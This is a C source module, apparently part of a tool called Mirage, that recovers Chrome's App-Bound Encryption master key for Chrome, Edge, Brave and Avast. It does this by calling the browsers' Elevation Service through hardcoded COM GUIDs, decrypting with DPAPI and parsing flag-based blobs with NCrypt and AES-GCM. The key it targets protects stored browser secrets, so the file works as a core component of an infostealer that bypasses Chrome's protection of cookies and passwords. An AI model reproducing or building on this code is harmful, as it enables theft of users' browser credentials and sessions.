/*
 * appbound.c — Chrome App-Bound Encryption key decryption
 *
 * Ported from Mirage Zig (appbound.zig, appbound_flags.zig, appbound_inject.zig).
 *
 * Chrome v120+ uses App-Bound Encryption: the master AES key is encrypted
 * via a COM interface (IElevator) in the Chrome Elevation Service.
 * The encrypted key is stored in Local State JSON under
 * "app_bound_encrypted_key" (base64-encoded).
 *
 * Decryption strategies (in order):
 *   1. DPAPI fallback — strip "APPB" prefix, CryptUnprotectData
 *   2. Flag-based — parse DPAPI-decrypted blob: flag 1/2/3/32
 *   3. COM IElevator — RPC to chrome.exe's Elevation Service
 *
 * Windows-only (COM + DPAPI + NCrypt). Linux stubs return error.
 */

#include "appbound.h"
#include "config.h"
#include "chrome_crypto.h"
#include "utils/base64.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#ifdef _WIN32
#include <windows.h>

/* ── DPAPI ─────────────────────────────────────────────────────── */

#ifndef CRYPTPROTECT_UI_FORBIDDEN
#define CRYPTPROTECT_UI_FORBIDDEN 0x01
#endif

#ifndef _WINCRYPT_H
typedef struct _CRYPTOAPI_BLOB {
    DWORD cbData;
    BYTE *pbData;
} DATA_BLOB, *PDATA_BLOB;
#endif

/* ── COM constants ─────────────────────────────────────────────── */

#ifndef CLSCTX_LOCAL_SERVER
#define CLSCTX_LOCAL_SERVER        4
#endif
#ifndef COINIT_APARTMENTTHREADED
#define COINIT_APARTMENTTHREADED   2
#endif
#ifndef RPC_C_AUTHN_LEVEL_PKT_PRIVACY
#define RPC_C_AUTHN_LEVEL_PKT_PRIVACY 6
#endif
#ifndef RPC_C_IMP_LEVEL_IMPERSONATE
#define RPC_C_IMP_LEVEL_IMPERSONATE   3
#endif
#ifndef EOAC_DYNAMIC_CLOAKING
#define EOAC_DYNAMIC_CLOAKING      0x40
#endif

/* ── Browser GUIDs (from appbound.zig) ─────────────────────────── */

typedef struct {
    CLSID clsid;
    IID iid_v1;
    IID iid_v2;
    int has_iid_v2;
} ElevatorGuids;

static const ElevatorGuids GUIDS_CHROME = {
    .clsid = { 0x70088608, 0xF641, 0x4611, { 0x88,0x95,0x7D,0x86,0x7D,0xD3,0x67,0x5B }},
    .iid_v1 = { 0x463ABECF, 0x410D, 0x407F, { 0x8A,0xF5,0x0D,0xF3,0x5A,0x00,0x5C,0xC8 }},
    .iid_v2 = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38 }},
    .has_iid_v2 = 1,
};

static const ElevatorGuids GUIDS_EDGE = {
    .clsid = { 0x1FFCE96C, 0x1697, 0x43AF, { 0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67 }},
    .iid_v1 = { 0xC9C2B807, 0x7731, 0x4F34, { 0x81,0xB7,0x44,0xFF,0x77,0x79,0x52,0x2B }},
    .iid_v2 = { 0x8F7B6792, 0x784D, 0x4047, { 0x84,0x5D,0x17,0x82,0xEF,0xBE,0xF2,0x05 }},
    .has_iid_v2 = 1,
};

static const ElevatorGuids GUIDS_BRAVE = {
    .clsid = { 0x576B31AF, 0x6369, 0x4B63, { 0x85,0x60,0xE4,0xB2,0x03,0xA9,0x7A,0x8B }},
    .iid_v1 = { 0xF396869E, 0x0C0E, 0x4C71, { 0x82,0x56,0x2F,0xAE,0x6D,0x75,0x9C,0xE9 }},
    .iid_v2 = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5,0xF4,0x3A,0x9B,0xB6,0x49,0x48,0x38 }},
    .has_iid_v2 = 1,
};

static const ElevatorGuids GUIDS_AVAST = {
    .clsid = { 0xEAD334E8, 0x8D08, 0x4CA1, { 0xAD,0xA3,0x64,0x75,0x43,0x74,0xD8,0x11 }},
    .iid_v1 = { 0x7737BB9F, 0xBAC1, 0x4C71, { 0xA6,0x96,0x7C,0x82,0xD7,0x99,0x4B,0x6F }},
    .iid_v2 = { 0 },
    .has_iid_v2 = 0,
};

static const ElevatorGuids *get_guids(AppBoundBrowser browser) {
    switch (browser) {
        case APPBOUND_CHROME: return &GUIDS_CHROME;
        case APPBOUND_EDGE:   return &GUIDS_EDGE;
        case APPBOUND_BRAVE:  return &GUIDS_BRAVE;
        case APPBOUND_AVAST:  return &GUIDS_AVAST;
        default:              return &GUIDS_CHROME;
    }
}

/* ── IElevator COM vtable (from appbound.zig) ──────────────────── */

/*
 * The IElevator interface inherits IUnknown:
 *   [0] QueryInterface
 *   [1] AddRef
 *   [2] Release
 *   [3] RunRecovery
 *   [4] EncryptData
 *   [5] DecryptData
 *
 * We define the vtable manually to avoid pulling in full COM headers.
 */

typedef struct IElevatorVtbl {
    /* IUnknown */
    HRESULT (__stdcall *QueryInterface)(void *this, REFIID riid, void **ppvObject);
    ULONG   (__stdcall *AddRef)(void *this);
    ULONG   (__stdcall *Release)(void *this);
    /* IElevator */
    HRESULT (__stdcall *RunRecovery)(void *this, const wchar_t *, const wchar_t *,
                                      const wchar_t *, const wchar_t *, ULONG, size_t *);
    HRESULT (__stdcall *EncryptData)(void *this, ULONG, const wchar_t *,
                                      wchar_t **, ULONG *);
    HRESULT (__stdcall *DecryptData)(void *this, const BSTR,
                                      wchar_t **, ULONG *);
} IElevatorVtbl;

/* ── App-Bound flag constants (from appbound_flags.zig) ────────── */

/*
 * The DPAPI-decrypted blob format (appbound_flags.zig):
 *   [0..3]  count (uint32 LE) — size of following data
 *   [count] padding/extra
 *   [next]  uint32 value:
 *     32  → next 32 bytes are plaintext key
 *     else → flag byte follows:
 *       1 → AES-GCM:  IV(12) + CT(32) + TAG(16), key=FLAG1_KEY
 *       2 → ChaCha20: IV(12) + CT(32) + TAG(16), key=FLAG2_KEY
 *       3/35 → NCrypt: enc_aes_key(32) + IV(12) + CT(32) + TAG(16)
 */

/*
 * Placeholder keys — in production these MUST be patched at build time
 * (e.g. via objcopy --update-section or a binary patch script).
 * If zero, Flag 1/3/35 decryption will fail silently.
 */
static const unsigned char FLAG1_KEY[32]      __attribute__((used)) = {0};
static const unsigned char FLAG2_KEY[32]      __attribute__((used)) = {0};
static const unsigned char FLAG3_XOR_KEY[32]  __attribute__((used)) = {0};

/* ── NCrypt function pointers (lazy-loaded) ────────────────────── */

/* Use ncrypt.h types — they define NCRYPT_HANDLE as ULONG_PTR */
#include <ncrypt.h>

typedef NTSTATUS (WINAPI *PFN_NCryptOpenStorageProvider)(NCRYPT_HANDLE *, const wchar_t *, ULONG);
typedef NTSTATUS (WINAPI *PFN_NCryptOpenKey)(NCRYPT_HANDLE, NCRYPT_HANDLE *, const wchar_t *, ULONG, ULONG);
typedef NTSTATUS (WINAPI *PFN_NCryptDecrypt)(NCRYPT_HANDLE, const PUCHAR, ULONG, void *,
                                              PUCHAR, ULONG, ULONG *, ULONG);
typedef NTSTATUS (WINAPI *PFN_NCryptFreeObject)(NCRYPT_HANDLE);

static HMODULE g_ncrypt_dll = NULL;
static PFN_NCryptOpenStorageProvider g_NCryptOpenStorageProvider = NULL;
static PFN_NCryptOpenKey             g_NCryptOpenKey = NULL;
static PFN_NCryptDecrypt             g_NCryptDecrypt = NULL;
static PFN_NCryptFreeObject          g_NCryptFreeObject = NULL;

static int ensure_ncrypt(void) {
    if (g_ncrypt_dll) return 1;
    g_ncrypt_dll = LoadLibraryA("ncrypt.dll");
    if (!g_ncrypt_dll) return 0;
    g_NCryptOpenStorageProvider = (PFN_NCryptOpenStorageProvider)
        GetProcAddress(g_ncrypt_dll, "NCryptOpenStorageProvider");
    g_NCryptOpenKey = (PFN_NCryptOpenKey)
        GetProcAddress(g_ncrypt_dll, "NCryptOpenKey");
    g_NCryptDecrypt = (PFN_NCryptDecrypt)
        GetProcAddress(g_ncrypt_dll, "NCryptDecrypt");
    g_NCryptFreeObject = (PFN_NCryptFreeObject)
        GetProcAddress(g_ncrypt_dll, "NCryptFreeObject");
    if (!g_NCryptOpenStorageProvider || !g_NCryptOpenKey ||
        !g_NCryptDecrypt || !g_NCryptFreeObject) {
        return 0;
    }
    return 1;
}

/* ── AES-GCM decrypt helper (via BCrypt) ───────────────────────── */

#include <bcrypt.h>

#ifndef BCRYPT_AES_GCM_ALGORITHM
#define BCRYPT_AES_GCM_ALGORITHM L"MS_AES_GCM"
#endif
#ifndef BCRYPT_CHAINING_MODE
#define BCRYPT_CHAINING_MODE L"ChainingMode"
#endif
#ifndef BCRYPT_CHAIN_MODE_GCM
#define BCRYPT_CHAIN_MODE_GCM L"ChainingModeGCM"
#endif

#ifndef BCRYPT_INIT_AUTH_MODE_INFO
typedef struct _BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
    ULONG cbSize;
    ULONG dwInfoVersion;
    PUCHAR pbNonce;
    ULONG cbNonce;
    PUCHAR pbAuthData;
    ULONG cbAuthData;
    PUCHAR pbTag;
    ULONG cbTag;
    PUCHAR pbMacContext;
    ULONG cbMacContext;
    ULONG cbAAD;
    ULONG cbData;
    ULONG dwFlags;
} BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO;
#define BCRYPT_INIT_AUTH_MODE_INFO(info) do { \
    memset(&(info), 0, sizeof(info)); \
    (info).dwInfoVersion = 1; \
} while(0)
#endif

#ifndef BCRYPT_KEY_DATA_BLOB_MAGIC
typedef struct _BCRYPT_KEY_DATA_BLOB_HEADER {
    ULONG dwMagic;
    ULONG dwVersion;
    ULONG cbKeyData;
} BCRYPT_KEY_DATA_BLOB_HEADER;
#define BCRYPT_KEY_DATA_BLOB_MAGIC    0x4542444b
#define BCRYPT_KEY_DATA_BLOB_VERSION1 1
#endif

static int aes_gcm_decrypt_256(const unsigned char *key32,
                                const unsigned char *nonce, size_t nonce_len,
                                const unsigned char *ciphertext, size_t ct_len,
                                const unsigned char *tag, size_t tag_len,
                                unsigned char *out, size_t out_max, size_t *out_len) {
    BCRYPT_ALG_HANDLE hAlgo = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;

    status = BCryptOpenAlgorithmProvider(&hAlgo, BCRYPT_AES_GCM_ALGORITHM, NULL, 0);
    if (status < 0) return -1;

    status = BCryptSetProperty(hAlgo, BCRYPT_CHAINING_MODE,
                               (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                               sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (status < 0) { BCryptCloseAlgorithmProvider(hAlgo, 0); return -1; }

    BCRYPT_KEY_DATA_BLOB_HEADER keyBlob;
    keyBlob.dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
    keyBlob.dwVersion = BCRYPT_KEY_DATA_BLOB_VERSION1;
    keyBlob.cbKeyData = 32;

    size_t blob_size = sizeof(keyBlob) + 32;
    unsigned char *blob = (unsigned char *)malloc(blob_size);
    if (!blob) { BCryptCloseAlgorithmProvider(hAlgo, 0); return -1; }
    memcpy(blob, &keyBlob, sizeof(keyBlob));
    memcpy(blob + sizeof(keyBlob), key32, 32);

    status = BCryptGenerateSymmetricKey(hAlgo, &hKey, NULL, 0,
                                         blob, (ULONG)blob_size, 0);
    free(blob);
    if (status < 0) { BCryptCloseAlgorithmProvider(hAlgo, 0); return -1; }

    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)nonce;
    authInfo.cbNonce = (ULONG)nonce_len;
    authInfo.pbTag = (PUCHAR)tag;
    authInfo.cbTag = (ULONG)tag_len;

    ULONG resultLen = 0;
    status = BCryptDecrypt(hKey, (PUCHAR)ciphertext, (ULONG)ct_len,
                            &authInfo, NULL, 0, out, (ULONG)out_max,
                            &resultLen, 0);

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgo, 0);

    if (status < 0) return -1;
    *out_len = (size_t)resultLen;
    return 0;
}

/* ── Read file helper ──────────────────────────────────────────── */

static unsigned char *read_file(const char *path, size_t *out_len) {
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz <= 0) { fclose(f); return NULL; }
    unsigned char *buf = (unsigned char *)malloc((size_t)sz);
    if (!buf) { fclose(f); return NULL; }
    size_t rd = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    if (rd != (size_t)sz) { free(buf); return NULL; }
    *out_len = rd;
    return buf;
}

/* ═══════════════════════════════════════════════════════════════════
 *  PUBLIC API
 * ═══════════════════════════════════════════════════════════════════ */

/* ── appbound_extract_key ──────────────────────────────────────── */

int appbound_extract_key(const char *json, size_t json_len,
                          unsigned char *out, size_t out_max,
                          size_t *out_len) {
    const char marker[] = "\"app_bound_encrypted_key\":\"";
    const size_t marker_len = sizeof(marker) - 1;

    /* Find marker */
    const char *start = NULL;
    for (size_t i = 0; i + marker_len <= json_len; i++) {
        if (memcmp(json + i, marker, marker_len) == 0) {
            start = json + i + marker_len;
            break;
        }
    }
    if (!start) return -1;

    /* Find closing quote */
    const char *end = NULL;
    for (const char *p = start; p < json + json_len; p++) {
        if (*p == '"') { end = p; break; }
    }
    if (!end || end == start) return -1;

    size_t b64_len = (size_t)(end - start);
    int decoded = base64_decode(start, b64_len, out, out_max);
    if (decoded < 0) return -1;
    *out_len = (size_t)decoded;
    return 0;
}

/* ── appbound_try_dpapi ────────────────────────────────────────── */

int appbound_try_dpapi(const unsigned char *blob, size_t blob_len,
                        unsigned char *out, size_t out_max,
                        size_t *out_len) {
    if (blob_len < 5) return -1;

    /* Skip "APPB" prefix (4 bytes) */
    size_t offset = 0;
    if (blob_len >= 4 && memcmp(blob, "APPB", 4) == 0)
        offset = 4;

    const unsigned char *dpapi_blob = blob + offset;
    size_t dpapi_len = blob_len - offset;

    if (dpapi_len < 2) return -1;

    /* Version byte check (0x01 for Chrome DPAPI) */
    if (dpapi_blob[0] != 0x01) {
        dbg_printf("[!] appbound_try_dpapi: version mismatch 0x%02x\n", dpapi_blob[0]);
        return -1;
    }

    DATA_BLOB input, output;
    input.cbData = (DWORD)(dpapi_len - 1);
    input.pbData = (BYTE *)(dpapi_blob + 1);
    memset(&output, 0, sizeof(output));

    if (!CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
        DWORD err = GetLastError();
        dbg_printf("[!] CryptUnprotectData failed: %lu\n", err);
        return -1;
    }

    size_t copy = (size_t)output.cbData;
    if (copy > out_max) copy = out_max;
    memcpy(out, output.pbData, copy);
    *out_len = copy;
    LocalFree(output.pbData);
    return 0;
}

/* ── appbound_decrypt_flags (internal) ─────────────────────────── */

/*
 * Parse the flag-based format from a DPAPI-decrypted App-Bound blob.
 * See appbound_flags.zig for the original Zig logic.
 */
static int appbound_decrypt_flags(const unsigned char *decrypted, size_t dec_len,
                                   unsigned char *key32) {
    if (dec_len < 8) return -1;

    size_t pos = 0;

    /* uint32 count */
    uint32_t count;
    memcpy(&count, decrypted + pos, 4);
    pos += 4;

    if (pos + count > dec_len) return -1;
    pos += count;

    if (pos + 4 > dec_len) return -1;

    /* uint32 value */
    uint32_t val;
    memcpy(&val, decrypted + pos, 4);
    pos += 4;

    /* Flag 32: plaintext key */
    if (val == 32) {
        if (pos + 32 > dec_len) return -1;
        memcpy(key32, decrypted + pos, 32);
        
        return 0;
    }

    if (pos >= dec_len) return -1;
    unsigned char flag = decrypted[pos];
    pos += 1;

    switch (flag) {
    case 1: {
        /* AES-GCM: IV(12) + CT(32) + TAG(16), key = FLAG1_KEY */
        if (pos + 12 + 32 + 16 > dec_len) return -1;
        const unsigned char *nonce_iv = decrypted + pos;

        size_t pt_len = 0;
        if (aes_gcm_decrypt_256(FLAG1_KEY, nonce_iv, 12,
                                 nonce_iv + 12, 32,
                                 nonce_iv + 44, 16,
                                 key32, 32, &pt_len) != 0)
            return -1;
        
        return 0;
    }

    case 2: {
        /* ChaCha20-Poly1305: IV(12) + CT(32) + TAG(16), key = FLAG2_KEY */
        if (pos + 12 + 32 + 16 > dec_len) return -1;

        /* ChaCha20-Poly1305 not supported on Windows (no BCrypt provider).
         * Skip — this flag is rare in practice. */
        dbg_printf("[!] appbound_decrypt_flags: Flag2 ChaCha20 not supported on Windows\n");
        return -1;
    }

    case 3:
    case 35: {
        /* NCrypt: enc_aes_key(32) + IV(12) + CT(32) + TAG(16) */
        if (pos + 32 + 12 + 32 + 16 > dec_len) return -1;
        const unsigned char *enc_aes_key = decrypted + pos; pos += 32;
        const unsigned char *nonce_iv = decrypted + pos;

        if (!ensure_ncrypt()) {
            dbg_printf("[!] appbound_decrypt_flags: NCrypt load failed\n");
            return -1;
        }

        /* Open Microsoft Software Key Storage Provider */
        NCRYPT_HANDLE hProvider = 0;
        NTSTATUS status = g_NCryptOpenStorageProvider(
            &hProvider, L"Microsoft Software Key Storage Provider", 0);
        if (status != 0) return -1;

        /* Open key "Google Chromekey1" */
        NCRYPT_HANDLE hKey = 0;
        status = g_NCryptOpenKey(hProvider, &hKey, L"Google Chromekey1", 0, 0);
        if (status != 0) { g_NCryptFreeObject(hProvider); return -1; }

        /* Decrypt the AES key */
        ULONG result_len = 0;
        status = g_NCryptDecrypt(hKey, (PUCHAR)enc_aes_key, 32,
                                  NULL, NULL, 0, &result_len, 64);
        if (status != 0 || result_len == 0 || result_len > 64) {
            g_NCryptFreeObject(hKey);
            g_NCryptFreeObject(hProvider);
            return -1;
        }

        unsigned char ncrypt_out[64];
        status = g_NCryptDecrypt(hKey, (PUCHAR)enc_aes_key, 32,
                                  NULL, ncrypt_out, result_len, &result_len, 64);
        g_NCryptFreeObject(hKey);
        g_NCryptFreeObject(hProvider);

        if (status != 0) return -1;
        if (result_len < 32) return -1;

        /* XOR with FLAG3_XOR_KEY to get the actual AES key */
        unsigned char aes_key[32];
        memcpy(aes_key, ncrypt_out, 32);
        for (int i = 0; i < 32; i++)
            aes_key[i] ^= FLAG3_XOR_KEY[i];

        /* Decrypt with the derived AES key */
        size_t pt_len = 0;
        if (aes_gcm_decrypt_256(aes_key, nonce_iv, 12,
                                 nonce_iv + 12, 32,
                                 nonce_iv + 44, 16,
                                 key32, 32, &pt_len) != 0)
            return -1;

        
        return 0;
    }

    default:
        dbg_printf("[!] appbound_decrypt_flags: unknown flag %d\n", flag);
        return -1;
    }
}

/* ── appbound_decrypt_com ──────────────────────────────────────── */

int appbound_decrypt_com(const unsigned char *encrypted_blob, size_t blob_len,
                          AppBoundBrowser browser,
                          unsigned char *key32) {
    if (blob_len < 4) return -1;

    const ElevatorGuids *guids = get_guids(browser);

    /* Initialize COM */
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (hr < 0) {
        dbg_printf("[!] CoInitializeEx failed: 0x%lx\n", (unsigned long)hr);
        return -1;
    }

    /* Create IElevator instance */
    IUnknown *elevator = NULL;
    hr = CoCreateInstance(&guids->clsid, NULL, CLSCTX_LOCAL_SERVER,
                           &guids->iid_v1, (void **)&elevator);
    if (hr < 0 || !elevator) {
        dbg_printf("[!] CoCreateInstance failed: 0x%lx\n", (unsigned long)hr);
        CoUninitialize();
        return -1;
    }

    /* Set proxy blanket for authentication */
    hr = CoSetProxyBlanket((IUnknown *)elevator,
                            RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
                            NULL,
                            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                            RPC_C_IMP_LEVEL_IMPERSONATE,
                            NULL,
                            EOAC_DYNAMIC_CLOAKING);
    if (hr < 0) {
        dbg_printf("[!] CoSetProxyBlanket failed: 0x%lx\n", (unsigned long)hr);
        elevator->lpVtbl->Release(elevator);
        CoUninitialize();
        return -1;
    }

    /* Get vtable pointer */
    IElevatorVtbl *vtbl = *(IElevatorVtbl **)elevator;

    /* Strip "APPB" prefix for COM call */
    const unsigned char *payload = encrypted_blob;
    size_t payload_len = blob_len;
    if (blob_len >= 4 && memcmp(encrypted_blob, "APPB", 4) == 0) {
        payload = encrypted_blob + 4;
        payload_len = blob_len - 4;
    }

    /* Convert payload to BSTR for COM call */
    BSTR bstr_payload = SysAllocStringByteLen((const char *)payload, (UINT)payload_len);
    if (!bstr_payload) {
        elevator->lpVtbl->Release(elevator);
        CoUninitialize();
        return -1;
    }

    /* Call DecryptData */
    wchar_t *plaintext_bstr = NULL;
    ULONG last_error = 0;
    hr = vtbl->DecryptData(elevator, bstr_payload, &plaintext_bstr, &last_error);
    SysFreeString(bstr_payload);

    if (hr < 0 || !plaintext_bstr) {
        dbg_printf("[!] IElevator::DecryptData failed: hr=0x%lx err=%lu\n",
               (unsigned long)hr, (unsigned long)last_error);
        elevator->lpVtbl->Release(elevator);
        CoUninitialize();
        return -1;
    }

    /* Extract 32-byte key from BSTR */
    UINT byte_len = SysStringByteLen(plaintext_bstr);
    if (byte_len < 32) {
        dbg_printf("[!] IElevator returned short key: %u bytes\n", byte_len);
        SysFreeString(plaintext_bstr);
        elevator->lpVtbl->Release(elevator);
        CoUninitialize();
        return -1;
    }

    memcpy(key32, plaintext_bstr, 32);
    SysFreeString(plaintext_bstr);
    elevator->lpVtbl->Release(elevator);
    CoUninitialize();

    
    return 0;
}

/* ── appbound_decrypt (main entry) ─────────────────────────────── */

int appbound_decrypt(const unsigned char *encrypted_blob, size_t blob_len,
                      AppBoundBrowser browser,
                      unsigned char *key32) {
    if (!encrypted_blob || blob_len < 5 || !key32) return -1;

    /* Strategy 1: DPAPI fallback */
    unsigned char dpapi_out[4096];
    size_t dpapi_len = 0;
    if (appbound_try_dpapi(encrypted_blob, blob_len,
                            dpapi_out, sizeof(dpapi_out), &dpapi_len) == 0) {
        

        /* Try flag-based parsing on the DPAPI result */
        if (appbound_decrypt_flags(dpapi_out, dpapi_len, key32) == 0) {
            
            return 0;
        }

        /* If DPAPI gave us exactly 32 bytes, use directly */
        if (dpapi_len >= 32) {
            memcpy(key32, dpapi_out, 32);
            
            return 0;
        }
    }

    /* Strategy 2: COM IElevator */
    
    if (appbound_decrypt_com(encrypted_blob, blob_len, browser, key32) == 0) {
        return 0;
    }

    dbg_printf("[!] appbound_decrypt: all strategies failed\n");
    return -1;
}

/* ── appbound_get_key (convenience) ────────────────────────────── */

int appbound_get_key(const char *local_state_path,
                      AppBoundBrowser browser,
                      unsigned char *key32) {
    if (!local_state_path || !key32) return -1;

    /* Read Local State file */
    size_t json_len = 0;
    unsigned char *json = read_file(local_state_path, &json_len);
    if (!json) {
        dbg_printf("[!] appbound_get_key: failed to read %s\n", local_state_path);
        return -1;
    }

    /* Extract encrypted_key (tries both regular and app_bound variants) */
    unsigned char enc_key[8192];
    size_t enc_len = 0;

    /* First try app_bound_encrypted_key */
    if (appbound_extract_key((const char *)json, json_len,
                              enc_key, sizeof(enc_key), &enc_len) == 0) {
        free(json);
        
        return appbound_decrypt(enc_key, enc_len, browser, key32);
    }

    /* Fallback: regular encrypted_key (DPAPI) */
    if (chrome_extract_encrypted_key((const char *)json, json_len,
                                      enc_key, sizeof(enc_key), &enc_len) == 0) {
        free(json);
        

        /* Try DPAPI decrypt */
        size_t dpapi_len = 0;
        unsigned char dpapi_out[256];
        if (chrome_decrypt_dpapi_key(enc_key, enc_len,
                                      dpapi_out, sizeof(dpapi_out), &dpapi_len) == 0) {
            size_t copy = dpapi_len < 32 ? dpapi_len : 32;
            memcpy(key32, dpapi_out, copy);
            if (copy < 32) memset(key32 + copy, 0, 32 - copy);
            
            return 0;
        }

        /* DPAPI failed — try appbound decrypt on regular key too */
        return appbound_decrypt(enc_key, enc_len, browser, key32);
    }

    free(json);
    dbg_printf("[!] appbound_get_key: no encrypted key found in Local State\n");
    return -1;
}

#else /* !WIN32 */

/* ═══════════════════════════════════════════════════════════════════
 *  Linux / macOS stubs
 * ═══════════════════════════════════════════════════════════════════ */

int appbound_extract_key(const char *json, size_t json_len,
                          unsigned char *out, size_t out_max,
                          size_t *out_len) {
    (void)json; (void)json_len; (void)out; (void)out_max; (void)out_len;
    return -1;
}

int appbound_decrypt(const unsigned char *encrypted_blob, size_t blob_len,
                      AppBoundBrowser browser,
                      unsigned char *key32) {
    (void)encrypted_blob; (void)blob_len; (void)browser; (void)key32;
    return -1;
}

int appbound_try_dpapi(const unsigned char *blob, size_t blob_len,
                        unsigned char *out, size_t out_max,
                        size_t *out_len) {
    (void)blob; (void)blob_len; (void)out; (void)out_max; (void)out_len;
    return -1;
}

int appbound_decrypt_com(const unsigned char *encrypted_blob, size_t blob_len,
                          AppBoundBrowser browser,
                          unsigned char *key32) {
    (void)encrypted_blob; (void)blob_len; (void)browser; (void)key32;
    return -1;
}

int appbound_get_key(const char *local_state_path,
                      AppBoundBrowser browser,
                      unsigned char *key32) {
    (void)local_state_path; (void)browser; (void)key32;
    return -1;
}

#endif /* _WIN32 */
